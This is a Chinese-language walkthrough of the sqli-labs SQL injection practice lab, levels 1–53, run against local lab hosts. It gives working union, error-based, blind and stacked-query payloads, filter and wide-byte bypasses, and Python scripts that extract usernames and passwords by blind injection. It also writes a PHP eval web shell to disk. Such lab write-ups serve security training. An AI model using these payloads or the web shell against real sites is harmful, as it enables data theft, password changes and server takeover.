# Basic Injections

## Less-1

先回顾一下基础内容，get传参1'：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240321163259.png)

根据报错可知是单引号闭合。

接着手工查询有多少列：?id=1' order by 3--+

4的时候报错，说明有3列。

复习一下联合注入：`UNION SELECT`是SQL的一部分，用于合并两个或多个`SELECT`语句的结果集，返回一个合并后的结果集。每个`SELECT`语句必须拥有相同数量的列，列的数据类型也需兼容，因为`UNION`操作是按列顺序合并它们的。默认情况下，`UNION`会移除重复的行。如果需要包含所有重复行，可以使用`UNION ALL`。这种操作常用于从不同的表中检索数据，然后将结果集合并为单一结果。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240321163916.png)

![image-20240321164017381](C:\Users\86158\AppData\Roaming\Typora\typora-user-images\image-20240321164017381.png)

?id=0%27union%20select%201,database(),3--+得到数据库为security。

爆表名：?id=0'union select 1,table_name,3 from information_schema.tables where table_schema='security'--+

`information_schema.tables`是一个特殊的数据库，提供了关于所有其他数据库中表的信息。通过从这个表中选择`table_name`列，可以列出特定数据库（在此例中为`security`）的所有表名。

加入limit。`LIMIT`子句用于指定从结果集中返回的记录的数量，其中第一个数字表示起始位置（从0开始），第二个数字表示记录的数量。因此，`LIMIT 0,0`意味着从第一个记录开始返回0条记录，实际上不会检索出任何数据。

?id=0'union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 0,1--+

通过limit 0,1  limit1,1...可以得到所有的表：emails,referers,uagents,users

同理爆列名：?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+

得到列名id,username,password

最后爆数据：?id=-1' union select 1,group_concat(username,password),3 from uses --+

## Less-2

数字型，无闭合方式

## Less-3

')

## Less-4

")

## Less-5

无回显，可以用报错注入、时间盲注和布尔盲注。

输入1\可知是单引号闭合

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240321172616.png)

查询语句正确时会显示You are in，错误则不显示。

爆库名：?id=1' and updatexml(1,concat(0x7e,(database()),0x7e),1) --+

其中`concat(0x7e,(database()),0x7e)`用于拼接当前数据库名称，`0x7e`表示波浪线`~`字符，用作分隔符。当`updatexml()`尝试更新一个XML文档并遇到错误时，数据库会返回一个详细错误信息，包括我们注入的数据库名称。这种方法常被用来发现网站背后数据库的结构或数据，是一种SQL注入攻击手段。请只在合法和安全的环境下进行安全测试。

爆表和列略

爆数据：?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,password)from users),0x7e),1) --+

然后是布尔注入，这是以前用的最多的注入方式。

## Less-6（布尔盲注

输入1\可知是"闭合。

布尔盲注脚本，原理略：

```python
import requests

url = 'http://127.0.0.1:1235/sqli-labs/Less-6/?id='
flag = ''
for i in range(1,1000):
    low = 32
    high = 126
    mid = (low + high) // 2
    while (low < high):
        #print(mid)
        #爆库
        payload1 = "1\"and (ascii(substr((select(database())),{0},1))>{1})--+".format(i,mid)
        #爆表
        payload2 = "1\"and (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='security')),{0},1))>{1})--+".format(i,mid)
        # 爆列
        payload3 = "1\"and (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),{0},1))>{1})--+".format(i, mid)
        # 爆数据
        payload4 = "1\"and (ascii(substr((select(group_concat(username,':',password))from(security.users)),{0},1))>{1})--+".format(i, mid)
        newurl = url + payload4
        print(newurl)
        r = requests.get(url=newurl)
        if("You are in" in r.text):
            low = mid + 1
        else:
            high = mid
        if(mid == 32 or mid == 126):
            break
        mid = (low + high) // 2
    flag += chr(mid)
    print(flag)
print(flag)
```

## Less-7（文件导出

输入1\可知闭合方式是'))

![image-20240323122312456](C:\Users\86158\AppData\Roaming\Typora\typora-user-images\image-20240323122312456.png)

用上面的脚本也能实现，但是这关提示我们用文件导出的方式进行注入。

导入一句话木马：http://127.0.0.1:1235/sqli-labs/Less-7/?id=-1')) union select 1,2,'<?php @eval($_POST["troy3e"]);?>' into outfile "E:\\\phpstudy_pro\\\WWW\\\sqli-labs\\\Less-7\\\test.php" --+

## Less-8（时间盲注

```python
import time

import requests

url = 'http://127.0.0.1:80/sqli-labs/Less-8/?id='
flag = ''
for i in range(1,1000):
    low = 32
    high = 126
    while (low < high):
        #print(mid)
        #爆库
        payload1 = "1'and if(ascii(substr((select(database())),{0},1))={1},sleep(1),null)--+".format(i,low)
        #爆表
        payload2 = "1'and if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='security')),{0},1))={1},sleep(1),null)--+".format(i,low)
        # 爆列
        payload3 = "1'and if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),{0},1))={1},sleep(1),null)--+".format(i, low)
        # 爆数据
        payload4 = "1'and if(ascii(substr((select(group_concat(username,':',password))from(security.users)),{0},1))={1},sleep(1),null)--+".format(i, low)
        newurl = url + payload4
        print(newurl)
        start = time.time()
        r = requests.get(url=newurl)
        end = time.time()
        if(end - start > 0.5):
            flag += chr(low)
            break
        else:
            low += 1
    print(flag)
print(flag)
```

## Less-9

同Less-8

## Less-10

"闭合，其它同Less-8。

## Less-11

变成了POST传参

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240325175834.png)

判断回显位置：uname=-1'union select 1,2--+&passwd=1&submit=Submit

其它和Less-1相同。

## Less-12

")闭合

## Less-13（POST时间盲注

')闭合，无回显。

1和0无区别，所以不能用布尔盲注，考虑用报错注入或者时间盲注。

报错注入：uname=0')union select 1,updatexml(1,concat(0x7e,database(),0x7e),1)#&passwd=1&submit=Submit

时间盲注：

```python
import time

import requests

url = 'http://127.0.0.1:1235/sqli-labs/Less-13/'
flag = ''
for i in range(1,1000):
    low = 32
    high = 126
    while (low < high):
        #print(mid)
        #爆库
        payload1 = "admin')and if(ascii(substr((select(database())),{0},1))={1},sleep(2),null)#".format(i,low)
        #爆表
        payload2 = "admin')and if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='security')),{0},1))={1},sleep(1),null)#".format(i,low)
        # 爆列
        payload3 = "admin')and if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),{0},1))={1},sleep(1),null)#".format(i, low)
        # 爆数据
        payload4 = "admin')and if(ascii(substr((select(group_concat(username,':',password))from(security.users)),{0},1))={1},sleep(1),null)#".format(i, low)
        start = time.time()
        data = {
            "uname" : payload1,
            "passwd" : "1",
            "submit" : "Submit"
        }
        r = requests.post(url=url,data=data)
        end = time.time()
        if(end - start > 1.8):
            flag += chr(low)
            break
        else:
            low += 1
    print(flag)
print(flag)
```

## Less-14

"闭合，其余同上

## Less-15

完全无回显，只能猜

admin' and sleep(3)#有延时

所以'闭合，其余和Less-13一样

## Less-16

")闭合，其余同Less-13

## Less-17（报错注入

可以修改任意用户的密码

用户名处过滤了单双引号，且整个语句应该是update，无法通过联合查询和盲注注入。

报错注入：

1.extractvalue()报错注入

extractvalue()函数对xml文档进行查询

语法：extractvalue(目标xml文档，xml路径)

这里xml路径是操作的重点，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式

这是xml路径的正确格式，如果输入的格式不正确，就会报错并返回内容，返回的内容可以根据需要设置为需要查询的内容

在语法格式正确的情况下，即使查不到任何数据，也不会出现报错

在语法格式错误的情乱下，即路径格式不是/xx/xx的情况下，会出现报错，且报错内容就是我们查询的内容。

uname=admin&passwd=1' and extractvalue(1,concat(0x5c,version(),0x5c))#&submit=Submit

注意，用户名需要是真实存在的。

后面与Less-1相同，略。

2.updatexml报错注入

UPDATEXML (XML_document, XPath_string, new_value)

updatexml与extractvalue注入类似，都是利用第二个参数的路径错误使得xpath语法报错，从而得到我们需要的数据

admin' and updatexml(1,concat(0x5c,version(),0x5c),1)#

## Less-18

抓包查看：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240326141607.png)

注释符似乎没用。

User-Agent: a' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1

后略

## Less-19

Referer: a' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1

## Less-20

Cookie: uname=admin' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1; privacy=true

# Advanced Injections

## Less-21

把上面的用base64编码

## Less-22

"闭合，其余同上。

## Less-23

会把注释符替换为空。

http://192.168.1.104:1235/sqli-labs/Less-23/?id=2' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1

或者联合注入也是可以的

?id=1' and union select 1,2,3 and '1'='1

## Less-24（二次注入

登陆界面和创建用户都进行了特殊字符的转义

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240327135130.png)

但是修改密码处没有处理session中的username

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240327135600.png)

那么只要注册一个名为admin'#的账号，即可修改admin的密码。虽然注册时被转义，但是取出来时转义符会自动去掉。

## Less-25

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240327140712.png)

替换了and和or为空，那么尝试用符号&和|，或者双写绕过。

http://192.168.1.104:1235/sqli-labs/Less-25/?id=-1' union select 1,2,3--+

## Less-26

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240327151006.png)

在上一关的基础上过滤了空格。

熟知的空格绕过方式有：/**/ （） + ` \t

http://192.168.1.104:1235/sqli-labs/Less-26/?id=-1'anandd(updatexml(1,concat(0x7e,database(),0x7e),1))anandd'1'='1

## Less-26a

盲注

http://192.168.1.104:1235/sqli-labs/Less-26a/?id=1')anandd(if(ascii(substr(database(),1,1))>1,sleep(1),null))anandd('1

## Less-27

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240327170420.png)

过滤了union和select，可以用大小写绕过

http://192.168.1.104:1235/sqli-labs/Less-27/?id=1'and(if(ascii(substr((selEct(database())),1,1))>1,sleep(1),null))and'1

## Less-27a

不知道为什么这里可以用双引号闭合：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240327172910.png)

http://192.168.1.104:1235/sqli-labs/Less-27a/?id=1" and(if(ascii(substr((selEct(database())),1,1))>1,sleep(1),null))and"1

## Less-28

http://192.168.1.119:1235/sqli-labs/Less-28/?id=0')union%0aunion%0aselectselect%0a1,database(),3%0aand('1

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240328131918.png)匹配的是union+空格+select，所以只要union%0aunion%0aselectselect即可绕过。

## Less-28a

过滤反而变简单了，略。

## Less-29（HTTP参数污染

实际上根本没过滤：http://192.168.1.119:1235/sqli-labs/Less-29/?id=-1'union select 1,database(),3--+。

但是网上讲了一个知识点，记录一下：

HTTP参数污染（HTTP Parameter Pollution） 攻击者通过在HTTP请求中插入特定的参数来发起攻击,如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240329111457.png)

waf服务器（tomcat）只解析重复参数里面的前者，而真正的web服务器（Apache）只解析重复参数里面的后者，我们可以传入两个id参数，前者合法而后者为我们想注入的内容

我们的后端是apache，那么我们只要将参数放在后面即可

http://192.168.1.119:1235/sqli-labs/Less-29/?id=1&id=-1'union select 1,database(),3--+

## Less-30

改为了双引号闭合

http://192.168.1.119:1235/sqli-labs/Less-30/?id=1&id=-1"union select 1,database(),3--+

## Less-31

改为了")闭合

http://192.168.1.119:1235/sqli-labs/Less-31/?id=1&id=-1")union select 1,database(),3--+

## Less-32（宽字节注入

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240329115826.png)

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240329115842.png)

将单双引号转换成了\\\，并且将字符集设置成了gbk，可以进行宽字节注入。

尝试`%df'`，然后将浏览器编码改为gbk，我们可以看到，他变成了汉字

这是因为加上反斜杠也就是`%5c`之后传入参数整体为`%df%5c%27`，而前面说过，在mysql里认为前两个字符是一个汉字，也就是‘運’，而后面的单引号就逃逸出来了

- 宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。

查询时，mysql会在布尔型判断时会将数字开头的字符串当成其开头的数字，但是注意字符串要被引号包裹

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240329150908.png)

http://192.168.1.119:1235/sqli-labs/Less-32/?id=-1%df'union select 1,2,3--+

## Less-33

换成了addslashes函数

函数返回在预定义字符之前添加反斜杠的字符串。
单引号（’）
双引号（"）
反斜杠（\）
NULL

绕过方式同上

## Less-34

post传参，绕过方式同上

## Less-35

数字型，直接注入

http://192.168.1.119:1235/sqli-labs/Less-35/?id=-1 union select 1,group_concat(database()),3--+

## Less-36

本关使用了`mysql_real_escape_string`函数

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240329155406.png)

但是设置了gbk编码，那么就会存在宽字节注入。

http://192.168.1.119:1235/sqli-labs/Less-36/?id=-1%df'union select 1,group_concat(database()),3--+

## Less-37

post，同上

# Stacked Injections

## Less-38（堆叠注入

堆叠注入：https://blog.csdn.net/hxhxhxhxx/article/details/108921489

修改密码：http://192.168.1.119:1235/sqli-labs/Less-38/?id=1';update users set password='123456'where username='Dumb';

## Less-39

数字型，可以堆叠。但是因为没过滤，也可以用联合注入等

http://192.168.1.119:1235/sqli-labs/Less-39/?id=-1 union select 1,database(),3;

## Less-40

')

http://192.168.1.119:1235/sqli-labs/Less-40/?id=-1') union select 1,database(),3;

## Less-41

http://192.168.1.119:1235/sqli-labs/Less-41/?id=-1 union select 1,database(),3;

## Less-42

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240329165010.png)

没有处理password，直接在password处堆叠注入修改admin密码即可。

## Less-43

')闭合

## Less-44

同42

## Less-45

同43

## Less-46（order by

order by 后面虽然不能进行奇奇怪怪的union注入，但是可以进行desc/asc进行排序。

有报错信息，所以尝试报错注入

http://192.168.1.119:1235/sqli-labs/Less-46/?sort=updatexml(1,concat(0x7e,database(),0x7e),1);

## Less-47（写文件的两种方法

上题也可以写入文件

http://192.168.1.119:1235/sqli-labs/Less-47/?sort=1' into outfile "E:\\phpstudy_pro\\WWW\\sqli-labs\\Less-47\\hack.php"lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240329172110.png)

## Less-48

双引号，其余同上

## Less-49

关闭了报错，不能用报错注入，其余同上。

## Less-50

可以写文件

http://192.168.1.119:1235/sqli-labs/Less-50/?sort=1 into outfile "E:\\phpstudy_pro\\WWW\\sqli-labs\\Less-50\\hack.php"lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+

但是写文件不常见，且这里存在`if (mysqli_multi_query($con1, $sql))`，所以还可以使用堆叠注入。

insert update。。

## Less-51

单引号闭合

## Less-52

同50，关闭了报错

## Less-53

同51，关闭了报错。

# Challenges

🕊

